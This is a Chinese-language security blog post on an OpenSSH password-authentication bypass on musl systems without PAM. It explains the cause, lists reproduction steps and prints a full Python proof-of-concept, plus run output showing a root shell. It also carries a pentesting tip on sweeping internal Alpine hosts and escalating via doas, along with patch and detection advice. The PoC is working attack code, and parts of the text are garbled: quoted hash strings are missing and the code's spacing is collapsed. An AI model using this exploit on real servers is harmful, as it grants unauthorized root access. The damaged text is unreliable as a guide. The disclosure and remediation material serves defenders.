#  OpenSSH/musl 密码认证绕过漏洞！  
Z0安全
                    Z0安全  Z0安全   2026-11-06 02:56  
  
## 前言  
  
11月5日，OpenSSH 紧急发布 10.6p2，修复被命名为 sshhole 的密码认证绕过漏洞（CVE-2026-123158，CVSS 8.1）。该机制自 2016 年引入，存量十年。  
  
要点：musl 无 PAM 下，"  
" 账户被 257–1024 字节超长口令绕过密码认证，可直取 root。musl 的 crypt() 遇超长口令返回 "  
"，与 shadow 里的 "*" 相等；同连接先借盐失败一次后，第二次超长口令即被接受。  
## 漏洞成因  
  
根因链：  
1. 1. musl 的 crypt() 内部实现（crypt_sha512.c / crypt_md5.c / crypt_blowfish.c / crypt_des.c 的 _  
crypt  
* 包装）失败时返回字符串 "*"，而 glibc/PAM 路径返回 NULL 或走 PAM。这个设计源自 2012 年 8 月的一次变更：当时大量程序不检查 crypt() 调用失败，返回 NULL 只会让它们拿空指针去 strcmp 直接崩，musl 干脆改成返回"不可匹配的哈希值"。POSIX 原文写的其实是失败应返回空指针并设置 errno，但规范只定义了一个错误码 ENOSYS，错误处理本身就是欠定义的——musl 选择了实用主义。  
  
1. 2. musl 的 sha256/sha512-crypt 有 KEY_MAX=256 的 DoS 保护（2012年8月底加入），口令 >256 字节时加密必然失败，于是 crypt() 返回 "*"。  
  
1. 3. sshd auth-passwd.c 的 sys_auth_passwd()：账户 shadow 字段为 "  
" 时 pw_password="  
"，只有 1 个字符，凑不出哈希所需的盐前缀，于是 salt=NULL → xcrypt() → pick_salt() 遍历 /etc/passwd，借用机器上某个真实 "  
  
..." 账户的算法前缀（实测借到 bob 的 "  
  
BobSalt1$"）；最终 strcmp(crypt(pw, borrowed_salt), "  
") 做比较，比较结果与 strlen(pw_password) 无关。256 字节时 crypt 正常返回真哈希，257~1024 字节则返回 "  
"，与影子条目 "*" 相等 → 认证通过。  
  
借盐逻辑是 2016 年 7 月为修 CVE-2016-6210 加的：那个洞允许攻击者通过"用户不存在"和"密码错误"的响应耗时差异枚举用户名，sshd 遂改为字段过短当不了盐时统一借盐，拉平两条路径的耗时。本漏洞从那时起即存在。  
1. 4. 触发前需要一次"错误口令"尝试：pick_salt() 第一次运行会遍历 /etc/passwd 调用 getspnam()，musl 的 getspnam 使用静态缓冲区，会把 sys_auth_passwd 里 pw_password 指向的 "*" 覆盖（实测被覆盖成空串，strcmp=36），同时把借来的盐缓存到 static salt[32]。因此在同一 TCP 连接内，第一次正常密码失败完成借盐缓存后，第二次用 257~1024 字节口令即被接受。  
  
1. 5. 上限 1024 来自 auth-passwd.c 的 MAX_PASSWORD_LEN，超过直接在协议层拒绝。  
  
## 影响场景  
  
<table><thead><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">触发条件</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">说明</span></span></section></td></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">musl libc</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">glibc 走 NULL 路径，不受影响</span></span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">sshd 无 PAM 构建</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">PAM 路径不经过该 strcmp</span></span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">PasswordAuthentication yes</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">关了密码登录即断链</span></span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">存在密码字段为 &#34;*&#34; 的账户</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">攻击目标</span></span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">至少一个 </span></span><span style="vertical-align: middle;line-height: 1;"><svg style="max-width: 300vw !important;width: 1.131ex;display: initial;" xmlns="http://www.w3.org/2000/svg" height="1.557ex" role="img" focusable="false" viewBox="0 -666 500 688" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"></g></g></g></svg></span><span leaf=""><span textstyle="" style="font-size: 18px;">/</span></span><span style="vertical-align: middle;line-height: 1;"><svg style="max-width: 300vw !important;width: 1.131ex;display: initial;" xmlns="http://www.w3.org/2000/svg" height="1.557ex" role="img" focusable="false" viewBox="0 -666 500 688" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"></g></g></g></svg></span><span leaf=""><span textstyle="" style="font-size: 18px;"> 真实哈希账户</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">供 pick_salt 借盐</span></span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">MaxAuthTries &gt;= 2</span></span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section style="margin-top: 16px;margin-bottom: 32px;text-indent: 0px;"><span leaf=""><span textstyle="" style="font-size: 18px;">默认即满足；打 root 另需 PermitRootLogin yes</span></span></section></td></tr></tbody></table>  
  
影响版本：2016 年以来至 10.6p2 之前，运行于 musl libc 且未启用 PAM 的 OpenSSH sshd。典型暴露面：Alpine（默认构建恰好无 PAM）、OpenWrt（默认 Dropbear 不受影响，另装 openssh-server 的中招）、Buildroot、Yocto 及各类 musl Docker 镜像。主流 Ubuntu/Debian 走 glibc + PAM，条件凑不齐，基本免疫。  
  
两个边界别搞混：shadow 字段为 "!" 的锁定账户不受影响（sshd 直接判定为锁定，走不到比对）；有真实密码哈希的账户不受影响——这是对"无密码"状态的绕过，不是密码破解器。  
  
渗透视角记一笔：打进内网后一把扫过去，跑 Alpine 的容器和嵌入式设备只要 22 端口可达、开着密码登录，知道一个仅密钥账户的用户名就能直接进去，root 场景配合 Alpine 默认 alpine 用户免密 doas 可二次提权。  
## 复现步骤  
1. 1. 准备 musl + 无 PAM 的 sshd。不想装完整 Alpine 的话，直接下一份 alpine-minirootfs（3MB）解到任意 Linux 目录里 chroot 进去即可，效果等价：minirootfs 提供 musl/openssl/apk，上游 openssh-10.6p1 源码 ./configure --without-pam 后编译安装，chroot 内起 /usr/local/sbin/sshd 监听 2226。源码包认准 tuna/官方源，有些镜像站对这个路径返回的是 JS 渲染的壳页，gzip -t 一下再解压，别让 12KB 的 HTML 骗过 tar。另一个坑：chroot 会继承宿主机 PATH，如果宿主 PATH 里没有 /sbin，进去后 apk 都找不到，记得在 chroot 内 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin。  
  
1. 2. 账户：/etc/shadow 中 root:  
、alice:  
（分别验证 root 场景与普通仅密钥账户），bob 设真实   
  
 哈希（供 pick_salt 借用）。  
  
1. 3. sshd_config：PasswordAuthentication yes，PermitRootLogin yes（验证 root 场景），PerSourcePenalties no。最后这行别漏——新版 sshd 的惩罚机制会把连续失败的测试连接限流掐断，第一次没跑通多半是这个原因，报错看着像编译问题，实际是 penalty。  
  
1. 4. 同一 TCP 连接内发送两次 password 认证：第一次任意错误口令（触发 pick_salt() 完成借盐并缓存），第二次发送 257~1024 字节口令（如 300 个 'A'）。注意必须是同一条连接，两次连接对应两个 sshd 子进程，盐缓存不共享，单发超长口令打不中。  
  
1. 5. 服务器返回 SSH_MSG_USERAUTH_SUCCESS，取得 shell：python3 poc_sshhole.py 127.0.0.1 2226 root → uid=0(root)；对 alice 同样成功 → uid=1002(alice)。  
  
1. 6. 对照组：单次尝试、256 字节（DoS 保护未触发，crypt 返回真哈希）、1025 字节（超 MAX_PASSWORD_LEN）均被拒绝；换 10.6p2 修复版重新编译后，全长度口令全部被拒绝。  
  
1. 7. 实测记录（Alpine 3.21.10 minirootfs + chroot，10.6p1 源码编译）：root 和 alice 均在"先错一次 + 300 字节"下拿到 shell，id 分别回 uid=0(root)、uid=1000(alice)；256 字节拒绝、1025 字节拒绝、不先错一次直接发 300 字节也拒绝；换 10.6p2 重编译替换后，同环境同账户全长度全被拒。五组行为与漏洞机理逐条对上。  
  
## 复现 POC  
```
#!/usr/bin/env python3"""sshhole PoC — OpenSSH < 10.6p2 password authentication bypass on musl libcwith PAM disabled (Alpine / OpenWrt / Buildroot / Yocto / musl images).usage:  poc_sshhole.py <host> <port> <user> [password length]  poc_sshhole.py 10.0.0.5 22 root            # default 300 bytes  poc_sshhole.py 10.0.0.5 22 deploy 512原理 (同一条连接内两次 password 认证):  1. 任意错误口令 -> sshd 执行 pick_salt(), 借用机器上某个真实 "$6$.."     账户的哈希前缀并缓存; 副作用: getspnam 静态缓冲区还会覆盖掉     本次认证的 pw_password 指针.  2. 257..1024 字节口令 -> musl crypt() 拒绝 >256 字节的 key 并返回     "*", 与目标账户 shadow 里的 "*" 相等 -> 认证通过.服务端前置条件:  * sshd 跑在 musl 上, PAM 关闭, PasswordAuthentication yes  * 目标账户存在且 /etc/shadow 字段恰为 "*"  * 机器上至少还有一个真实 "$..." 哈希账户 (供借盐)  * MaxAuthTries >= 2 (默认); 打 root 还需 PermitRootLogin yes注意: 字段为 "!" 的锁定账户不受影响(sshd 判定为锁定), 有真实哈希的账户也不受影响 — 这是绕过"无密码"状态, 不是密码破解器."""import sysimport paramikoargv = sys.argv[1:]iflen(argv) < 3:    print(__doc__)    sys.exit(2)HOST = argv[0]PORT = int(argv[1])USER = argv[2]length = int(argv[3]) iflen(argv) > 3else300defconnect():    t = paramiko.Transport((HOST, PORT))    t.start_client(timeout=10)    t.banner_timeout = 15    return tdefattempt(t, password):    try:        t.auth_password(USER, password)        returnTrue    except paramiko.AuthenticationException:        returnFalse    except Exception as e:        print(f"[!] transport error: {type(e).__name__}: {e}")        returnFalsedefrun(t, cmd):    ch = t.open_session()    ch.exec_command(cmd)    return ch.makefile("rb").read().decode(errors="replace").strip()defmain():    t = connect()    print(f"[*] {HOST}:{PORT}  server={t.remote_version}  user={USER}  pwlen={length}")    # 第一次: 任意错误口令, 触发 pick_salt() 借盐并缓存 (同一个 sshd 子进程内)    print("[*] attempt 1: wrong password -> ", end="", flush=True)    if attempt(t, "sshhole-wrong-password"):        print("ACCEPTED (unexpected, wrong password worked?)")        return1    print("denied")    # 第二次: 绕过本体    print(f"[*] attempt 2: {length} x 'A' -> ", end="", flush=True)    ifnot attempt(t, "A" * length):        print("denied -> not vulnerable (or precondition not met)")        t.close()        return1    print("ACCEPTED")    print("[+] authenticated, command output:")    for cmd in ("id", "uname -sr"):        try:            print("    " + cmd + ": " + run(t, cmd).replace("\n", " | "))        except Exception as e:            print(f"    {cmd}: (failed: {e})")    t.close()    return0sys.exit(main())
```  
  
复现成功：  
  
[root@centos76oracle19c ~]# /root/poc_sshhole.sh 127.0.0.1 2226 root  
  
[*] 127.0.0.1:2226  server=SSH-2.0-OpenSSH_10.6  user=root  pwlen=300  
  
[*] attempt 1: wrong password -> denied  
  
[*] attempt 2: 300 x 'A' -> ACCEPTED  
  
[+] authenticated, command output:  
  
    id: uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)  
  
    uname -sr: Linux 3.10.0-957.el7.x86_64  
  
[root@centos76oracle19c ~]#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuSfucPryHVGswmKzDas87EyA38jt6tSavN6EZnUicDK8wgvm5efKgndmGhUu0jGibAyga07aLRq4zBuHvhYom8u9tXXjibO50G5IaIWOiaoSbc/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuSfucPryHWMjmvgN8IglIR8GFNRwZZlhan1KEW3j8LPOnk68d4sPyutBRVnGQBPLBIltIslCzTGA5nSMW5tibXEbMk3GkS70HZfO4XBd9VA/640?wx_fmt=png&from=appmsg "")  
```

```  
## 修复与自查  
  
升级 OpenSSH 10.6p2 并重启 sshd，两步缺一不可——只升级不重启，老进程还带着旧代码跑。10.6p2 在认证路径新增密码哈希最短长度检查（MIN_PASSWORD_HASH_LEN=4），存储字段不足 4 字符直接判定不通过，"*" 不再参与比较。官方口径这是临时规避，根因在 libc 返回值约定的分歧而非 sshd 本身。  
  
Alpine 3.16~3.24 均已出修复包（3.21.10、3.22.8、3.23.8、3.24.4 点版本已含）：apk upgrade -U -a 后 rc-service sshd restart。  
  
一时升不动的，在 /etc/ssh/sshd_config.d/00-no-passwords.conf 写 PasswordAuthentication no 并重启，切纯密钥登录；PermitRootLogin 同步设为 prohibit-password 或 no。一个坑：不要自作聪明把 shadow 里的 "*" 批量改成 "!" 加固——无 PAM 的 musl 系统上这会让合法用户的 SSH 密钥登录一起失效。  
  
失陷排查看三处：sshd 日志里本应无密码的账户出现 "Accepted password"；doas/sudo 使用记录；近期新建用户、文件变动与 authorized_keys 改动。排除不了异常登录，按官方口径直接按已失陷处置。  
  
   
  
点个关注吧~  
  
  
  
